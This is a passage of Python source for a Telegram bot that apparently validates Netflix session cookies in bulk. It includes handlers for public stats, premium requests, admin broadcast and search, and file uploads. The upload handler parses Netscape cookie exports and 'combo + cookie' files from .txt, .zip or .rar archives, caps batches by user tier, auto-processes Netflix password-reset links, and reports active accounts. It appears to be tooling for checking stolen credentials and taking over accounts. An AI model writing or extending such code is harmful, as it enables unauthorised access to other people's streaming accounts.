async def public_stats_callback(query, context: ContextTypes.DEFAULT_TYPE):
    stats = get_public_stats()
    uptime = _format_uptime(time.time() - BOT_STARTED_AT)
    msg = (
        f"📈 <b>Public Stats</b>\n\n"
        f"<b>Date:</b> {html.escape(stats['date'])}\n"
        f"<b>Total Checks Today:</b> {stats['total_checks_today']}\n"
        f"<b>Active Users Today:</b> {stats['active_users_today']}\n"
        f"<b>Success Rate:</b> {stats['success_rate']}%\n"
        f"<b>Uptime:</b> {html.escape(uptime)}\n\n"
        f"🟢 Active: {stats['active']}\n"
        f"🟡 On Hold: {stats['on_hold']}\n"
        f"🔴 Expired: {stats['expired']}\n"
        f"❓ Unknown: {stats['unknown']}"
    )
    keyboard = [[premium_button("Back", callback_data="back_to_start", emoji="left", style="primary")]]
    await query.edit_message_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))


async def report_issue_callback(query, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["support_mode"] = "issue"
    msg = (
        "🛠 <b>Report Issue</b>\n\n"
        "Send one message with the problem, error text, or screenshot note. "
        "I will forward it to the admins."
    )
    keyboard = [[premium_button("Back", callback_data="back_to_start", emoji="left", style="primary")]]
    await query.edit_message_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))


async def request_premium_callback(query, context: ContextTypes.DEFAULT_TYPE):
    user_id = query.from_user.id
    usage, files, is_premium, _ = get_user_usage(user_id)
    limit, file_limit = get_user_limits(user_id)

    if is_premium:
        keyboard = [[premium_button("Back", callback_data="back_to_start", emoji="left", style="primary")]]
        await query.edit_message_text("⭐ You already have premium access.", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    body = (
        "<b>Premium request received.</b>\n"
        f"Single checks today: <code>{usage}/{limit}</code>\n"
        f"File checks today: <code>{files}/{file_limit}</code>"
    )
    await _notify_admins(context, "⭐ Premium Request", query.from_user, body)

    keyboard = [[premium_button("Back", callback_data="back_to_start", emoji="left", style="primary")]]
    await query.edit_message_text(
        "✅ Premium request sent to admins.",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )


async def handle_support_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    support_mode = context.user_data.pop("support_mode", None)
    if support_mode != "issue":
        return False

    text = (update.message.text or "").strip()
    if not text:
        await update.message.reply_text("Please send issue details as text.")
        return True

    safe_text = html.escape(text[:3000])
    if len(text) > 3000:
        safe_text += "\n\n[Message truncated]"

    await _notify_admins(
        context,
        "🛠 Issue Report",
        update.effective_user,
        f"<b>Message:</b>\n<pre>{safe_text}</pre>",
    )
    await update.message.reply_text("✅ Issue report sent to admins.")
    return True


async def handle_admin_text_flow(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user = update.effective_user
    if not user or user.id not in ADMIN_IDS:
        return False

    mode = context.user_data.pop("admin_mode", None)
    if not mode:
        return False

    text = (update.message.text or "").strip()
    if mode == "search_user":
        results = search_users(text)
        if not results:
            await update.message.reply_text(
                "No users found.",
                reply_markup=InlineKeyboardMarkup([[premium_button("Dashboard", callback_data="admin_dashboard", emoji="compass", style="primary")]]),
            )
            return True

        keyboard = []
        for item in results:
            target_id = int(item["user_id"])
            username = item.get("username") or f"ID {target_id}"
            status = "⭐" if item.get("is_premium") else "👤"
            status = "🔴" if item.get("is_banned") else status
            keyboard.append([InlineKeyboardButton(f"{status} {username} ({target_id})", callback_data=f"user_info_{target_id}")])
        keyboard.append([premium_button("Dashboard", callback_data="admin_dashboard", emoji="compass", style="primary")])
        await update.message.reply_text(
            f"🔎 Search results for {html.escape(text)}",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
        return True

    if mode == "broadcast_draft":
        if not text:
            await update.message.reply_text("Broadcast message cannot be empty.")
            return True
        context.user_data["broadcast_draft"] = text
        user_count = len(get_all_user_ids())
        preview = html.escape(text[:3000])
        if len(text) > 3000:
            preview += "\n\n[Preview truncated]"
        keyboard = [
            [InlineKeyboardButton(f"✅ Send to {user_count} users", callback_data="admin_broadcast_confirm")],
            [InlineKeyboardButton("❌ Cancel", callback_data="admin_broadcast_cancel")],
        ]
        await update.message.reply_text(
            f"📢 <b>Broadcast Preview</b>\n\n<pre>{preview}</pre>",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
        return True

    return False


async def show_help_callback(query, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "<b>Help</b>\n\n"
        "1. Send cookie text directly — no button needed.\n"
        "2. Or upload a .txt/.zip/.rar file directly.\n"
        "3. For files, review the summary and choose a check mode.\n"
        "4. Use cancel if you need to stop a queued or running file check."
    )
    
    keyboard = [
        [InlineKeyboardButton("📊 My Limits", callback_data="user_stats")],
        [premium_button("Main Menu", callback_data="back_to_start", emoji="home", style="primary")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        help_text,
        parse_mode='HTML',
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )


async def user_stats_callback(query, context):
    user_id = query.from_user.id
    usage, files, is_premium, is_banned = get_user_usage(user_id)
    limit, file_limit = get_user_limits(user_id)
    
    if is_banned:
        msg = "❌ <b>Your account has been banned from using this bot.</b>"
    else:
        msg = (
            f"{pe('chart')} <b>My Limits</b>\n\n"
            f"<b>Status:</b> {pe('star') + ' Premium' if is_premium else pe('user') + ' Regular'}\n"
            f"<b>Single Checks:</b> {usage}/{'∞' if limit == float('inf') else limit}\n"
            f"<b>File Checks:</b> {files}/{'∞' if file_limit == float('inf') else file_limit}\n"
            f"<b>Processing:</b> Queue enabled"
        )
    
    keyboard = [
        [premium_button("Back", callback_data="back_to_start", emoji="left", style="primary")],
    ]
    
    await query.edit_message_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))


async def handle_document(update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_channel_membership(update, context):
        return
    user = update.effective_user
    user_id = user.id

    if is_user_banned(user.id):
        await update.message.reply_text("You are banned from using this bot.")
        return

    if user_has_active_file_job(user_id):
        await update.message.reply_text("You already have a file check running or queued. Cancel or wait for it to finish first.")
        return

    document = update.message.document
    file_name = document.file_name or "upload"
    mime_type = document.mime_type or ""

    try:
        validate_document_size(document)
    except UploadValidationError as exc:
        await update.message.reply_text(str(exc))
        return

    usage_count, file_checks_count, is_premium, _ = get_user_usage(user.id)
    daily_limit, file_daily_limit = get_user_limits(user.id)

    if file_checks_count >= file_daily_limit:
        await update.message.reply_text(f"You have reached your daily limit of {file_daily_limit} file checks.")
        return

    temp_path = None
    prepared_path = None
    try:
        tg_file = await context.bot.get_file(document.file_id)
        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
            temp_path = temp_file.name
        await tg_file.download_to_drive(temp_path)

        prepared = extract_upload_text(temp_path, file_name, mime_type)
        full_content = prepared.content

        is_netscape = full_content.strip().startswith('# Netscape HTTP Cookie File') or ('\t' in full_content and '.netflix.com' in full_content)
        if is_netscape:
            logger.info("Detected Netscape format file. Processing as a single account.")
            if usage_count >= daily_limit:
                await update.message.reply_text(f"You have reached your single check limit of {daily_limit}.")
                return

            header_string = convert_netscape_to_header_string(full_content)
            if header_string:
                await process_single_cookie_instant(update, context, header_string, user_id)
            else:
                await update.message.reply_text("Could not parse the Netscape cookie file.")
            return

        records = merge_adjacent_credentials(split_cookie_records(full_content))
        deduped = dedupe_cookie_records(records)
        if not deduped.unique_records:
            await update.message.reply_text(
                "No supported cookie records found. Send a Netscape export, header-string cookie, or combo + cookie text file."
            )
            return
        is_admin = user_id in ADMIN_IDS
        limit = float('inf') if is_admin else (500 if is_premium else 200)
        if len(deduped.unique_records) > limit:
            logger.warning("User %s uploaded %s unique cookie records; limit is %s", user_id, len(deduped.unique_records), limit)
            await update.message.reply_text(
                f"File Too Large\n\nYour file or archive contains more than {limit} unique cookies. Please reduce it and try again."
            )
            return

        pending_dir = DATA_DIR / "pending_uploads"
        pending_dir.mkdir(parents=True, exist_ok=True)
        with tempfile.NamedTemporaryFile(
            delete=False,
            suffix='.txt',
            prefix=f"user_{user_id}_",
            dir=pending_dir,
            mode='w',
            encoding='utf-8',
        ) as new_file:
            new_file.write('\n'.join(deduped.unique_records))
            prepared_path = new_file.name

    except UploadValidationError as exc:
        logger.warning("Rejected upload from user %s: %s", user_id, exc)
        await update.message.reply_text(str(exc))
        return
    except (OSError, UnicodeError, TelegramError) as exc:
        logger.error("Error during file pre-processing for user %s: %s", user_id, exc)
        await update.message.reply_text("I could not read that upload. Please try a smaller .txt, .zip, or .rar file.")
        return
    finally:
        if temp_path and os.path.exists(temp_path):
            os.unlink(temp_path)

    # Check if the file contains reset links (lines starting with reset URL)
    reset_pattern = re.compile(r'^https?://(?:www\.)?netflix\.com/password\?g', re.IGNORECASE)
    is_reset_links_file = False
    with open(prepared_path, 'r', encoding='utf-8') as f:
        for line in f:
            if reset_pattern.match(line.strip()):
                is_reset_links_file = True
                break

    file_id = save_pending_file(
        user_id,
        prepared_path,
        source_label=prepared.source_label,
        total_records=deduped.total_records,
        unique_records=len(deduped.unique_records),
        duplicate_records=deduped.duplicate_records,
        original_filename=file_name,
    )
    prepared_path = None
    context.user_data.pop("input_mode", None)

    if is_reset_links_file:
        # Auto-start reset links processing
        await process_reset_links_file(update, context, file_id, user_id)
        return

    queue = get_file_queue_snapshot()
    quick_eta = format_duration(estimate_file_wait_seconds(len(deduped.unique_records), "quick"))
    full_eta = format_duration(estimate_file_wait_seconds(len(deduped.unique_records), "full"))

    keyboard = [
        [InlineKeyboardButton(f"⚡ Quick Check (~{quick_eta})", callback_data=f"quick_check_{file_id}")],
        [InlineKeyboardButton(f"📦 Full Results File (~{full_eta})", callback_data=f"all_at_once_{file_id}")],
        [InlineKeyboardButton("📨 Send Active One By One", callback_data=f"one_by_one_{file_id}")],
        [InlineKeyboardButton("❌ Cancel Upload", callback_data=f"discard_file_{file_id}")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="back_to_start")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "📁 <b>File Summary</b>\n\n"
        f"<b>Source:</b> {html.escape(prepared.source_label)}\n"
        f"<b>Total Found:</b> {deduped.total_records}\n"
        f"<b>Unique To Check:</b> {len(deduped.unique_records)}\n"
        f"<b>Duplicates Removed:</b> {deduped.duplicate_records}\n"
        f"<b>Active Large Jobs:</b> {queue['active']}\n"
        f"<b>Queued Jobs:</b> {queue['queued']}\n\n"
        "Choose how to process this file.",
        reply_markup=reply_markup,
        parse_mode='HTML',
    )
